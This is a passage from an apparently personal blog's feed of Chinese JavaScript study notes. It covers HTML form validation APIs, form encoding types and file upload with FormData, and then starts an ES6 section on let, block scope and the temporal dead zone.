<h5 id="13-3-4-validationMessage-属性"><a href="#13-3-4-validationMessage-属性" class="headerlink" title="13.3.4 validationMessage 属性"></a>13.3.4 validationMessage 属性</h5><p>控件元素的<code>validationMessage</code>属性返回一个字符串，表示控件不满足校验条件时，浏览器显示的提示文本。以下两种情况，该属性返回空字符串。</p>
<ul>
<li>该控件不会在提交时自动校验</li>
<li>该控件满足校验条件</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;form&gt;&lt;input type=&quot;text&quot; required&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">&#x27;form input&#x27;</span>).validationMessage</span><br><span class="line"><span class="comment">// &quot;请填写此字段。&quot;</span></span><br></pre></td></tr></table></figure>
<p>下面是另一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myInput = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;myinput&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!myInput.checkValidity()) &#123;</span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">&#x27;prompt&#x27;</span>).innerHTML = myInput.validationMessage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="13-3-5-setCustomValidity"><a href="#13-3-5-setCustomValidity" class="headerlink" title="13.3.5 setCustomValidity()"></a>13.3.5 setCustomValidity()</h5><p>控件元素的<code>setCustomValidity()</code>方法用来定制校验失败时的报错信息。它接受一个字符串作为参数，该字符串就是定制的报错信息。如果参数为空字符串，则上次设置的报错信息被清除。</p>
<p>这个方法可以替换浏览器内置的表单验证报错信息，参数就是要显示的报错信息。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;somefile.php&quot;</span>&gt;</span><br><span class="line">  &lt;input</span><br><span class="line">    type=<span class="string">&quot;text&quot;</span></span><br><span class="line">    name=<span class="string">&quot;username&quot;</span></span><br><span class="line">    placeholder=<span class="string">&quot;Username&quot;</span></span><br><span class="line">    pattern=<span class="string">&quot;[a-z]&#123;1,15&#125;&quot;</span></span><br><span class="line">    id=<span class="string">&quot;username&quot;</span></span><br><span class="line">  &gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>上面的表单输入框，要求只能输入小写字母，且不得超过15个字符。如果输入不符合要求（比如输入“ABC”），提交表单的时候，Chrome 浏览器会弹出报错信息“Please match the requested format.”，禁止表单提交。下面使用<code>setCustomValidity()</code>方法替换掉报错信息。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> input = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">input.oninvalid = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  event.target.setCustomValidity(</span><br><span class="line">    <span class="string">&#x27;用户名必须是小写字母，不能为空，最长不超过15个字符&#x27;</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>setCustomValidity()</code>方法是在<code>invalid</code>事件的监听函数里面调用。该方法也可以直接调用，这时如果参数不为空字符串，浏览器就会认为该控件没有通过校验，就会立刻显示该方法设置的报错信息。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* HTML 代码如下</span></span><br><span class="line"><span class="comment">&lt;form&gt;</span></span><br><span class="line"><span class="comment">  &lt;p&gt;&lt;input type=&quot;file&quot; id=&quot;fs&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="comment">  &lt;p&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="comment">&lt;/form&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;fs&#x27;</span>).onchange = checkFileSize;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFileSize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> fs = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> files = fs.files;</span><br><span class="line">  <span class="keyword">if</span> (files.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">     <span class="keyword">if</span> (files[<span class="number">0</span>].size &gt; <span class="number">75</span> * <span class="number">1024</span>) &#123;</span><br><span class="line">       fs.setCustomValidity(<span class="string">&#x27;文件不能大于 75KB&#x27;</span>);</span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  fs.setCustomValidity(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码一旦发现文件大于 75KB，就会设置校验失败，同时给出自定义的报错信息。然后，点击提交按钮时，就会显示报错信息。这种校验失败是不会自动消除的，所以如果所有文件都符合条件，要将报错信息设为空字符串，手动消除校验失败的状态。</p>
<h5 id="13-3-6-validity-属性"><a href="#13-3-6-validity-属性" class="headerlink" title="13.3.6 validity 属性"></a>13.3.6 validity 属性</h5><p>控件元素的属性<code>validity</code>属性返回一个<code>ValidityState</code>对象，包含当前校验状态的信息。</p>
<p>该对象有以下属性，全部为只读属性。</p>
<ul>
<li><code>ValidityState.badInput</code>:布尔值，表示浏览器是否不能将用户的输入转换成正确的类型，比如用户在数值框里面输入字符串。</li>
<li><code>ValidityState.customError</code>:布尔值，表示是否已经调用setCustom+ `Validity()方法，将校验信息设置为一个非空字符串。</li>
<li><code>ValidityState.patternMismatch</code>:布尔值，表示用户输入的值是否不满足模式的要求。</li>
<li><code>ValidityState.rangeOverflow</code>:布尔值，表示用户输入的值是否大于最大范围。</li>
<li><code>ValidityState.rangeUnderflow</code>:布尔值，表示用户输入的值是否小于最小范围。</li>
<li><code>ValidityState.stepMismatch</code>:布尔值，表示用户输入的值不符合步长的设置（即不能被步长值整除）。</li>
<li><code>ValidityState.tooLong</code>:布尔值，表示用户输入的字数超出了最长字数。</li>
<li><code>ValidityState.tooShort</code>:布尔值，表示用户输入的字符少于最短字数。</li>
<li><code>ValidityState.typeMismatch</code>:布尔值，表示用户填入的值不符合类型要求（主要是类型为 Email 或 URL 的情况）。</li>
<li><code>ValidityState.Valid</code>:布尔值，表示用户是否满足所有校验条件。</li>
<li><code>ValidityState.valueMissing</code>:布尔值，表示用户没有填入必填的值。</li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> input = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;myinput&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (input.validity.valid) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;通过校验&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;校验失败&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面是另外一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> txt = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.getElementById(<span class="string">&#x27;myInput&#x27;</span>).validity.rangeOverflow) &#123;</span><br><span class="line">  txt = <span class="string">&#x27;数值超过上限&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;prompt&#x27;</span>).innerHTML = txt;</span><br></pre></td></tr></table></figure>
<p>如果想禁止浏览器弹出表单验证的报错信息，可以监听<code>invalid</code>事件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> input = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> form  = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;form&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> elem = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">elem.id  = <span class="string">&#x27;notify&#x27;</span>;</span><br><span class="line">elem.style.display = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">form.appendChild(elem);</span><br><span class="line"></span><br><span class="line">input.addEventListener(<span class="string">&#x27;invalid&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  event.preventDefault();</span><br><span class="line">  <span class="keyword">if</span> (!event.target.validity.valid) &#123;</span><br><span class="line">    elem.textContent   = <span class="string">&#x27;用户名必须是小写字母&#x27;</span>;</span><br><span class="line">    elem.className     = <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">    elem.style.display = <span class="string">&#x27;block&#x27;</span>;</span><br><span class="line">    input.className    = <span class="string">&#x27;invalid animated shake&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">input.addEventListener(<span class="string">&#x27;input&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&#x27;block&#x27;</span> === elem.style.display ) &#123;</span><br><span class="line">    input.className = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    elem.style.display = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>上面代码中，一旦发生<code>invalid</code>事件（表单验证失败），<code>event.preventDefault()</code>用来禁止浏览器弹出默认的验证失败提示，然后设置定制的报错提示框。</p>
<h5 id="13-3-7-表单的-novalidate-属性"><a href="#13-3-7-表单的-novalidate-属性" class="headerlink" title="13.3.7 表单的 novalidate 属性"></a>13.3.7 表单的 novalidate 属性</h5><p>表单元素的 HTML 属性<code>novalidate</code>，可以关闭浏览器的自动校验。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form novalidate&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>这个属性也可以在脚本里设置。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">form.noValidate = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
<p>如果表单元素没有设置<code>novalidate</code>属性，那么提交按钮（<code>&lt;button&gt;</code>或<code>&lt;input&gt;</code>元素）的<code>formnovalidate</code>属性也有同样的作用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span> formnovalidate&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<h4 id="13-4-enctype-属性"><a href="#13-4-enctype-属性" class="headerlink" title="13.4 enctype 属性"></a>13.4 enctype 属性</h4><p>表单能够用四种编码，向服务器发送数据。编码格式由表单的<code>enctype</code>属性决定。</p>
<p>假定表单有两个字段，分别是<code>foo</code>和<code>baz</code>，其中<code>foo</code>字段的值等于<code>bar</code>，<code>baz</code>字段的值是一个分为两行的字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">The first line.</span><br><span class="line">The second line.</span><br></pre></td></tr></table></figure>
<p>下面四种格式，都可以将这个表单发送到服务器。</p>
<h6 id="（1）GET-方法"><a href="#（1）GET-方法" class="headerlink" title="（1）GET 方法"></a>（1）GET 方法</h6><p>如果表单使用<code>GET</code>方法发送数据，<code>enctype</code>属性无效。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form</span><br><span class="line">  action=<span class="string">&quot;register.php&quot;</span></span><br><span class="line">  method=<span class="string">&quot;get&quot;</span></span><br><span class="line">  onsubmit=<span class="string">&quot;AJAXSubmit(this); return false;&quot;</span></span><br><span class="line">&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>数据将以 URL 的查询字符串发出。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">?foo=bar&amp;baz=The%20first%20line.%0AThe%20second%20line.</span><br></pre></td></tr></table></figure>
<h6 id="（2）application-x-www-form-urlencoded"><a href="#（2）application-x-www-form-urlencoded" class="headerlink" title="（2）application/x-www-form-urlencoded"></a>（2）application/x-www-form-urlencoded</h6><p>如果表单用<code>POST</code>方法发送数据，并省略<code>enctype</code>属性，那么数据以<code>application/x-www-form-urlencoded</code>格式发送（因为这是默认值）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form</span><br><span class="line">  action=<span class="string">&quot;register.php&quot;</span></span><br><span class="line">  method=<span class="string">&quot;post&quot;</span></span><br><span class="line">  onsubmit=<span class="string">&quot;AJAXSubmit(this); return false;&quot;</span></span><br><span class="line">&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>发送的 HTTP 请求如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">foo=bar&amp;baz=The+first+line.%0D%0AThe+second+line.%0D%0A</span><br></pre></td></tr></table></figure>
<p>上面代码中，数据体里面的<code>%0D%0A</code>代表换行符（<code>\r\n</code>）。</p>
<h6 id="（3）text-plain"><a href="#（3）text-plain" class="headerlink" title="（3）text/plain"></a>（3）text/plain</h6><p>如果表单使用<code>POST</code>方法发送数据，<code>enctype</code>属性为<code>text/plain</code>，那么数据将以纯文本格式发送。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form</span><br><span class="line">  action=<span class="string">&quot;register.php&quot;</span></span><br><span class="line">  method=<span class="string">&quot;post&quot;</span></span><br><span class="line">  enctype=<span class="string">&quot;text/plain&quot;</span></span><br><span class="line">  onsubmit=<span class="string">&quot;AJAXSubmit(this); return false;&quot;</span></span><br><span class="line">&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>发送的 HTTP 请求如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">foo=bar</span><br><span class="line">baz=The first line.</span><br><span class="line">The second line.</span><br></pre></td></tr></table></figure>
<h6 id="（4）multipart-form-data"><a href="#（4）multipart-form-data" class="headerlink" title="（4）multipart/form-data"></a>（4）multipart/form-data</h6><p>如果表单使用<code>POST</code>方法，<code>enctype</code>属性为<code>multipart/form-data</code>，那么数据将以混合的格式发送。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form</span><br><span class="line">  action=<span class="string">&quot;register.php&quot;</span></span><br><span class="line">  method=<span class="string">&quot;post&quot;</span></span><br><span class="line">  enctype=<span class="string">&quot;multipart/form-data&quot;</span></span><br><span class="line">  onsubmit=<span class="string">&quot;AJAXSubmit(this); return false;&quot;</span></span><br><span class="line">&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>发送的 HTTP 请求如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=---------------------------<span class="number">314911788813839</span></span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">314911788813839</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;foo&quot;</span></span><br><span class="line"></span><br><span class="line">bar</span><br><span class="line">-----------------------------<span class="number">314911788813839</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;baz&quot;</span></span><br><span class="line"></span><br><span class="line">The first line.</span><br><span class="line">The second line.</span><br><span class="line"></span><br><span class="line">-----------------------------<span class="number">314911788813839</span>--</span><br></pre></td></tr></table></figure>
<p>这种格式也是文件上传的格式。</p>
<h4 id="13-5-文件上传"><a href="#13-5-文件上传" class="headerlink" title="13.5 文件上传"></a>13.5 文件上传</h4><p>用户上传文件，也是通过表单。具体来说，就是通过文件输入框选择本地文件，提交表单的时候，浏览器就会把这个文件发送到服务器。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;myFile&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>此外，还需要将表单<code>&lt;form&gt;</code>元素的<code>method</code>属性设为<code>POST</code>，<code>enctype</code>属性设为<code>multipart/form-data</code>。其中，<code>enctype</code>属性决定了 HTTP 头信息的<code>Content-Type</code>字段的值，默认情况下这个字段的值是<code>application/x-www-form-urlencoded</code>，但是文件上传的时候要改成<code>multipart/form-data</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;选择一个文件&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;myFile&quot;</span> multiple&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> id=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit_button&quot;</span> value=<span class="string">&quot;上传&quot;</span> /&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>上面的 HTML 代码中，file 控件的<code>multiple</code>属性，指定可以一次选择多个文件；如果没有这个属性，则一次只能选择一个文件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fileSelect = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> files = fileSelect.files;</span><br></pre></td></tr></table></figure>
<p>然后，新建一个 FormData 实例对象，模拟发送到服务器的表单数据，把选中的文件添加到这个对象上面。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> formData = <span class="keyword">new</span> FormData();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; files.length; i++) &#123;</span><br><span class="line">  <span class="keyword">var</span> file = files[i];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 只上传图片文件</span></span><br><span class="line">  <span class="keyword">if</span> (!file.type.match(<span class="string">&#x27;image.*&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  formData.append(<span class="string">&#x27;photos[]&#x27;</span>, file, file.name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后，使用 Ajax 向服务器上传文件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">xhr.open(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;handler.php&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">xhr.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (xhr.status !== <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;An error occurred!&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.send(formData);</span><br></pre></td></tr></table></figure>
<p>除了发送 FormData 实例，也可以直接 AJAX 发送文件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> file = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;test-input&#x27;</span>).files[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">xhr.open(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;myserver/uploads&#x27;</span>);</span><br><span class="line">xhr.setRequestHeader(<span class="string">&#x27;Content-Type&#x27;</span>, file.type);</span><br><span class="line">xhr.send(file);</span><br></pre></td></tr></table></figure>
<p><code>Well,that&#39;s all for today</code></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 浏览器模型-表单，FormData 对象</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0072</title>
    <url>/2021/06/13/%E6%89%93%E5%8D%A10072/</url>
    <content><![CDATA[<p><font color=#50b7c1>只要内心不乱，外界就很难改变你什么。记住，不要艳羡他人，不要输掉自己。</font></p>
<h2 id="ES6"><a href="#ES6" class="headerlink" title="ES6"></a>ES6</h2><h3 id="2-let-和-const-命令"><a href="#2-let-和-const-命令" class="headerlink" title="2. let 和 const 命令"></a>2. let 和 const 命令</h3><h4 id="2-1-let-命令"><a href="#2-1-let-命令" class="headerlink" title="2.1 let 命令"></a>2.1 let 命令</h4><h5 id="2-1-1-基本用法"><a href="#2-1-1-基本用法" class="headerlink" title="2.1.1 基本用法"></a>2.1.1 基本用法</h5><p>ES6 新增了<code>let</code>命令，用来声明变量。它的用法类似于<code>var</code>，但是所声明的变量，只在<code>let</code>命令所在的代码块内有效。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">var</span> b = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a <span class="comment">// ReferenceError: a is not defined.</span></span><br><span class="line">b <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码在代码块之中，分别用<code>let</code>和<code>var</code>声明了两个变量。然后在代码块之外调用这两个变量，结果<code>let</code>声明的变量报错，<code>var</code>声明的变量返回了正确的值。这表明，<code>let</code>声明的变量只在它所在的代码块有效。</p>
<p><code>for</code>循环的计数器，就很合适使用<code>let</code>命令。</p>
<span id="more"></span>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(i);</span><br><span class="line"><span class="comment">// ReferenceError: i is not defined</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，计数器<code>i</code>只在<code>for</code>循环体内有效，在循环体外引用就会报错。</p>
<p>下面的代码如果使用<code>var</code>，最后输出的是<code>10</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">  a[i] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line">a[<span class="number">6</span>](); <span class="comment">// 10</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，变量<code>i</code>是<code>var</code>命令声明的，在全局范围内都有效，所以全局只有一个变量<code>i</code>。每一次循环，变量<code>i</code>的值都会发生改变，而循环内被赋给数组<code>a</code>的函数内部的<code>console.log(i)</code>，里面的<code>i</code>指向的就是全局的<code>i</code>。也就是说，所有数组<code>a</code>的成员里面的<code>i</code>，指向的都是同一个<code>i</code>，导致运行时输出的是最后一轮的i的值，也就是 10。</p>
<p>如果使用<code>let</code>，声明的变量仅在块级作用域内有效，最后输出的是 6。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">  a[i] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line">a[<span class="number">6</span>](); <span class="comment">// 6</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，变量<code>i</code>是<code>let</code>声明的，当前的<code>i</code>只在本轮循环有效，所以每一次循环的i其实都是一个新的变量，所以最后输出的是<code>6</code>。你可能会问，如果每一轮循环的变量<code>i</code>都是重新声明的，那它怎么知道上一轮循环的值，从而计算出本轮循环的值？这是因为 JavaScript 引擎内部会记住上一轮循环的值，初始化本轮的变量<code>i</code>时，就在上一轮循环的基础上进行计算。</p>
<p>另外，<code>for</code>循环还有一个特别之处，就是设置循环变量的那部分是一个父作用域，而循环体内部是一个单独的子作用域。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">  <span class="keyword">let</span> i = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// abc</span></span><br><span class="line"><span class="comment">// abc</span></span><br><span class="line"><span class="comment">// abc</span></span><br></pre></td></tr></table></figure>
<p>上面代码正确运行，输出了 3 次<code>abc</code>。这表明函数内部的变量<code>i</code>与循环变量<code>i</code>不在同一个作用域，有各自单独的作用域。</p>
<h5 id="2-1-2-不存在变量提升"><a href="#2-1-2-不存在变量提升" class="headerlink" title="2.1.2 不存在变量提升"></a>2.1.2 不存在变量提升</h5><p><code>var</code>命令会发生“变量提升”现象，即变量可以在声明之前使用，值为<code>undefined</code>。这种现象多多少少是有些奇怪的，按照一般的逻辑，变量应该在声明语句之后才可以使用。</p>
<p>为了纠正这种现象，<code>let</code>命令改变了语法行为，它所声明的变量一定要在声明后使用，否则报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// var 的情况</span></span><br><span class="line"><span class="built_in">console</span>.log(foo); <span class="comment">// 输出undefined</span></span><br><span class="line"><span class="keyword">var</span> foo = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// let 的情况</span></span><br><span class="line"><span class="built_in">console</span>.log(bar); <span class="comment">// 报错ReferenceError</span></span><br><span class="line"><span class="keyword">let</span> bar = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
<p>上面代码中，变量<code>foo</code>用<code>var</code>命令声明，会发生变量提升，即脚本开始运行时，变量<code>foo</code>已经存在了，但是没有值，所以会输出<code>undefined</code>。变量<code>bar</code>用<code>let</code>命令声明，不会发生变量提升。这表示在声明它之前，变量<code>bar</code>是不存在的，这时如果用到它，就会抛出一个错误。</p>
<h5 id="2-1-3-暂时性死区"><a href="#2-1-3-暂时性死区" class="headerlink" title="2.1.3 暂时性死区"></a>2.1.3 暂时性死区</h5><p>只要块级作用域内存在<code>let</code>命令，它所声明的变量就“绑定”（binding）这个区域，不再受外部的影响。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> tmp = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  tmp = <span class="string">&#x27;abc&#x27;</span>; <span class="comment">// ReferenceError</span></span><br><span class="line">  <span class="keyword">let</span> tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，存在全局变量<code>tmp</code>，但是块级作用域内<code>let</code>又声明了一个局部变量<code>tmp</code>，导致后者绑定这个块级作用域，所以在<code>let</code>声明变量前，对<code>tmp</code>赋值会报错。</p>
<p>ES6 明确规定，如果区块中存在<code>let</code>和<code>const</code>命令，这个区块对这些命令声明的变量，从一开始就形成了封闭作用域。凡是在声明之前就使用这些变量，就会报错。</p>
<p>总之，在代码块内，使用<code>let</code>命令声明变量之前，该变量都是不可用的。这在语法上，称为“暂时性死区”（temporal dead zone，简称 TDZ）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="comment">// TDZ开始</span></span><br><span class="line">  tmp = <span class="string">&#x27;abc&#x27;</span>; <span class="comment">// ReferenceError</span></span><br><span class="line">  <span class="built_in">console</span>.log(tmp); <span class="comment">// ReferenceError</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> tmp; <span class="comment">// TDZ结束</span></span><br><span class="line">  <span class="built_in">console</span>.log(tmp); <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line">  tmp = <span class="number">123</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(tmp); <span class="comment">// 123</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，在<code>let</code>命令声明变量<code>tmp</code>之前，都属于变量<code>tmp</code>的“死区”。</p>
<p>“暂时性死区”也意味着<code>typeof</code>不再是一个百分之百安全的操作。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span> x; <span class="comment">// ReferenceError</span></span><br><span class="line"><span class="keyword">let</span> x;</span><br></pre></td></tr></table></figure>
